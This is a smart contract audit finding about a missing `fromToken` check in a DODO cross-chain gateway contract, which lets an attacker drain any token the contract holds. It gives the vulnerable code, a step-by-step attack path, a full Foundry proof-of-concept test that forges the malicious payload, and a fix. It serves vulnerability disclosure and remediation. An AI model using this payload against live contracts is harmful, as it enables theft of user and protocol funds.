# Gateway Transfer Native Token Drain Vulnerability

## Summary
Missing validation of `params.fromToken` in `_doMixSwap` lets an attacker swap any token the contract holds, not the one it just received. This allows total theft of idle balances from GatewayTransferNative because an attacker can deposit a cheap token, forge the payload to point at a valuable token already in the contract, and the router will spend it on their behalf.

## Root Cause
In `GatewayTransferNative.sol` the contract approves whatever token the message says, not the token it actually received:

**Reference**: [GatewayTransferNative.sol#L425](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L425)

```solidity
function _doMixSwap(  
    bytes memory swapData,  
    uint256 amount,  
    MixSwapParams memory params  
) internal returns (uint256 outputAmount) {  
    if (swapData.length == 0) {  
        return amount;  
    }  

    // BUG: params.fromToken is untrusted, should equal zrc20  
    IZRC20(params.fromToken).approve(DODOApprove, amount);  

    return IDODORouteProxy(DODORouteProxy).mixSwap{value: msg.value}(  
        params.fromToken,  
        params.toToken,  
        params.fromTokenAmount,  
        ...  
    );  
}
```

Because `params.fromToken` comes straight from the user-supplied message, the contract may approve and transfer any asset it is currently holding.

## Attack Path
1. Attacker deposits a minimal amount of T₍cheap₎ or triggers a cross-chain call delivering T₍cheap₎
2. In the payload, they set `params.fromToken = T₍val₎` and `params.fromTokenAmount` to the contract's balance of T₍val₎
3. GatewayTransferNative enters `_doMixSwap`, approves DODO to spend the contract's entire T₍val₎ balance
4. DODO router transfers T₍val₎, swaps it for the attacker's chosen asset, and sends proceeds per params
5. Attacker withdraws or receives the swapped funds; GatewayTransferNative's T₍val₎ balance is now zero

## Impact
- The protocol treasury / users whose transfers are in-flight lose up to the full balance of every token the contract holds (unbounded value)
- The attacker gains the same amount minus DEX fees

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT  

pragma solidity ^0.8.7;  

import {IZRC20} from "@zetachain/protocol-contracts/contracts/zevm/interfaces/IZRC20.sol";  
import "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";  
import {UniswapV2Library} from "../contracts/libraries/UniswapV2Library.sol";  
import {SwapDataHelperLib} from "../contracts/libraries/SwapDataHelperLib.sol";  
import {BaseTest} from "./BaseTest.t.sol";  
import {console} from "forge-std/console.sol";  

/* forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public */  
contract GatewayCrossChainTest is BaseTest {  
    function test_Exploit_DrainValuableToken() public {  
        // --- Setup ---  
        address valuableToken = address(token1Z);  
        address cheapToken = address(token2Z);  
        uint256 valuableTokenInitialBalance = 100 ether;  
        uint256 cheapTokenDepositAmount = 1 ether;  

        token1Z.mint(address(gatewayCrossChain), valuableTokenInitialBalance);  
        assertEq(token1Z.balanceOf(address(gatewayCrossChain)), valuableTokenInitialBalance);  

        if (token2Z.balanceOf(user1) < cheapTokenDepositAmount) {  
            token2Z.mint(user1, cheapTokenDepositAmount - token2Z.balanceOf(user1));  
        }  
        uint256 attackerInitialCheapToken = token2Z.balanceOf(user1);  

        // --- Attacker Prepares Malicious Payload ---  
        bytes32 externalId = keccak256(abi.encodePacked("exploit_test", block.timestamp));  
        uint32 dstChainId = 2;  
        address targetZRC20_payload = cheapToken;  

        bytes memory sender_for_payload = abi.encodePacked(user1);  
        bytes memory receiver_for_payload = bytes(""); // MODIFIED: Empty receiver for smaller emit message  

        address[] memory dummyMaliciousAdapters = new address[](1);  
        dummyMaliciousAdapters[0] = address(0);  
        address[] memory dummyMaliciousPairs = new address[](1);  
        dummyMaliciousPairs[0] = address(0);  
        address[] memory dummyMaliciousAssetTo = new address[](1);  
        dummyMaliciousAssetTo[0] = user1;  
        bytes[] memory dummyMaliciousMoreInfo = new bytes[](1);  
        dummyMaliciousMoreInfo[0] = bytes("");  

        // Calculate fee-adjusted amount BEFORE preparing swapDataZ_malicious  
        uint256 feePercent = gatewayCrossChain.feePercent();  
        uint256 platformFeesForTx = (cheapTokenDepositAmount * feePercent) / 1000;  
        uint256 amountForSwapAfterPlatformFee = cheapTokenDepositAmount - platformFeesForTx;  

        bytes memory swapDataZ_malicious = encodeCompressedMixSwapParams(  
            valuableToken,  
            cheapToken,  
            amountForSwapAfterPlatformFee, // MODIFIED: Use fee-adjusted amount  
            0,  
            0,  
            dummyMaliciousAdapters,  
            dummyMaliciousPairs,  
            dummyMaliciousAssetTo,  
            0,  
            dummyMaliciousMoreInfo,  
            abi.encode(user1, 0),  
            block.timestamp + 600  
        );  

        bytes memory contractAddress_dummy = bytes(""); // Ensures GatewayZEVMMock returns early  
        bytes memory swapDataB_for_payload = bytes(""); // MODIFIED: Empty swapDataB for smaller emit message  
        bytes memory accounts_dummy = "";  

        bytes memory payload = encodeMessage(  
            dstChainId,  
            targetZRC20_payload,  
            sender_for_payload,  
            receiver_for_payload,  
            swapDataZ_malicious,  
            contractAddress_dummy,  
            swapDataB_for_payload,  
            accounts_dummy  
        );  

        // --- Execute the Attack ---  
        uint256 contractValuableTokenBalanceBefore = token1Z.balanceOf(address(gatewayCrossChain));  

        token2Z.mint(address(gatewayCrossChain), cheapTokenDepositAmount); // Simulate cheap token deposit to contract  

        vm.prank(address(gatewayZEVM));  
        gatewayCrossChain.onCall(  
            MessageContext({origin: "", sender: address(gatewaySendA), chainID: 1}),  
            cheapToken,  
            cheapTokenDepositAmount,  
            bytes.concat(externalId, payload)  
        );  

        // --- Assertions ---  
        uint256 expectedContractValuableTokenBalanceAfter =  
            contractValuableTokenBalanceBefore - amountForSwapAfterPlatformFee;  
        assertEq(  
            token1Z.balanceOf(address(gatewayCrossChain)),  
            expectedContractValuableTokenBalanceAfter,  
            "Valuable token not drained correctly from contract"  
        );  

        uint256 attackerCheapTokenBalanceAfter = token2Z.balanceOf(user1);  
        uint256 expectedAttackerCheapTokenBalanceAfter = attackerInitialCheapToken + (amountForSwapAfterPlatformFee * 2); // Assuming 1:2 DODO mock rate (valuable -> cheap)  

        assertEq(  
            attackerCheapTokenBalanceAfter,  
            expectedAttackerCheapTokenBalanceAfter,  
            "Attacker did not receive swapped cheap tokens as expected"  
        );  

        uint256 dodoProxyInitialToken1ZBalance =  
            token1Z.balanceOf(address(dodoRouteProxyZ)) - amountForSwapAfterPlatformFee;  
        assertEq(  
            token1Z.balanceOf(address(dodoRouteProxyZ)),  
            dodoProxyInitialToken1ZBalance + amountForSwapAfterPlatformFee,  
            "DODO proxy (ZetaChain) balance of valuable token is incorrect after swap"  
        );  

        console.log("Exploit test_Exploit_DrainValuableToken successful: Contract valuable token balance reduced.");  
        console.log("Contract valuable token (token1Z) before:", contractValuableTokenBalanceBefore);  
        console.log("Contract valuable token (token1Z) after:", token1Z.balanceOf(address(gatewayCrossChain)));  
        console.log("Attacker (user1) cheap token (token2Z) before:", attackerInitialCheapToken);  
        console.log("Attacker (user1) cheap token (token2Z) after swap:", token2Z.balanceOf(user1));  
    }  
}
```

## Recommended Mitigation
Add an invariant check before calling `_doMixSwap`:

```solidity
require(params.fromToken == zrc20, "Mismatched fromToken");
```